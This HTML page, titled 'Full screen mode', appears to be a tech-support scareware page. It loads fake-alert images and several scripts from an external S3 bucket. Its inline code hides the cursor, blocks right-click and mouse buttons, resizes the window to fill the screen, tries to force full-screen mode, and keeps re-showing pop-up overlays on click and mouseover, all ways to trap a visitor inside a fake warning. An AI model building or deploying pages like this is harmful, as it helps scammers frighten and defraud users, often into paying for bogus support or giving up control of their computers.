<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
    <meta content="noindex,nofollow" name="robots">
    <title>Full screen mode</title>
    <link href="msmm.png" rel="icon" id="favicon" type="image/png">
    <link href="https://files-pop.s3.ap-northeast-1.amazonaws.com/tapa.css" rel="stylesheet">
    <script type='text/javascript' src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
    <script type="text/javascript">//<![CDATA[
    $(function(){
    $('body').bind('contextmenu', function(evt){
    return false;
    });
    });//]]>
    </script>
    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/noir.js"></script>
  </head>
  <body class="map" id="mycanvas" style="cursor:none">
    <div class="bg" style="cursor:none">
      <div class="bgimg" style="top:0">
        <img src="https://files-pop.s3.ap-northeast-1.amazonaws.com/f24.png" alt="" width="100%">
      </div>
    </div>
    <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
      <div class="black" style="height: 145%; cursor: none; display: block;"></div>
    </a>
    <div class="pro_box" style="cursor: none; display: block;">
      <img src="https://files-pop.s3.ap-northeast-1.amazonaws.com/bx1.png" alt="" style="width: 600px;">
    </div>
    <div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999;" id="footer">
      <img src="https://files-pop.s3.ap-northeast-1.amazonaws.com/bottom+bar.png" alt="" style="width: 100%;">
    </div>
    <div class="lightbox" id="poptxt" style="display: block;">
      <img src="https://files-pop.s3.ap-northeast-1.amazonaws.com/main.png" style="width: 580px;">
    </div>
    <div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new">
      <img src="https://files-pop.s3.ap-northeast-1.amazonaws.com/blue+with+movement.png" style="width: 450px;">
    </div>
    <div class="answer_list" style="background-color:#000;height:auto;width:600px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
      <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">
        <img src="https://files-pop.s3.ap-northeast-1.amazonaws.com/black+bar+top.png" alt="" style="width: 550px;">
      </p>
    </div>
    <div id="chat" style="display: block;">
      <img src="https://files-pop.s3.ap-northeast-1.amazonaws.com/bottom+right+.png" style="width: 200px;">
    </div>
    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/nvidia.js"></script>
    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/jupiter.js"></script>
    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/progress.js"></script>
    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/main.js"></script>
    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/btn.js"></script>
    <script>
      setInterval(function() {
        // Guard: element may be injected by external scripts; avoid crashing if missing.
        var pridezEl = document.getElementById("pridez");
        if (pridezEl && typeof pridezEl.play === "function") {
          try {
            pridezEl.play();
          } catch (e) {}
        }
      }, 500);
    </script>
    <script>
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#welcomeDiv").show()
        })
      });
    </script>
    <script>
      $(document).ready(function() {
        $(".pro_box").delay(900).fadeIn(800);
        $(".black").delay(1E3).fadeIn(800);
        $(".pro_box2").delay(2500).fadeIn(800);
        $(".pro_box3").delay(3500).fadeIn(800);
        $("#pop_up_new").delay(4E3).fadeIn(800);
        $("#poptxt").delay(4E3).fadeIn(800)
      });
    </script>
    <script>
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#poptxt").show()
        })
      });
      $(document).ready(function() {
        // Guard: #cross may not exist in this HTML.
        if ($("#cross").length) {
          $("#cross").click(function() {
            $("#poptxt").show()
          })
        }
      });
    </script>

    <script>
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#footer").show()
        })
      });
    </script>
    <script>
      $(document).ready(function() {
        $("body").mouseover(function() {
          $("#poptxt").show()
        })
      });
    </script>
    <script>
      var isNetscape = "Netscape" == navigator.appName ? 1 : 0;
      "Netscape" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);

      function onContextMenuBlock() {
        return !1
      }

      function onMouseButtonBlock(evt) {
        evt = isNetscape ? evt : event;
        evt = isNetscape ? evt.which : evt.button;
        if (2 == evt || 3 == evt) return !1
      }
      document.oncontextmenu = onContextMenuBlock;
      document.onmousedown = onMouseButtonBlock;
      document.onmouseup = onMouseButtonBlock;
    </script>
    <script>
      window.onload = function() {
        window.moveTo(0, 0);
        window.resizeTo(screen.availWidth, screen.availHeight)
      };
    </script>
    <script>
      $(document).ready(function() {
        $("#chat").delay(600).fadeIn(100)
      });
    </script>

   <script type="text/javascript">
    // Guard: these elements may not exist in this HTML.
    var ageModalEl = document.getElementById("age-confirmation-modal");
    if (ageModalEl) {
      ageModalEl.onclick = function() {
        ageModalEl.style.display = "none";
        var otherContentEl = document.getElementById("other-content");
        if (otherContentEl) otherContentEl.style.display = "inline";

        addEventListener("click", function() {
          var
                rootEl = document.documentElement
              , requestFullScreen =
                     rootEl.requestFullScreen
                  || rootEl.webkitRequestFullScreen
                  || rootEl.mozRequestFullScreen
          ;
          requestFullScreen && requestFullScreen.call(rootEl);
        });
      }
    }
     $("a#thing_to_click").click(function(evt){
         evt.preventDefault();
         window.location = "#";
    });

    </script>

  </body>
</html>
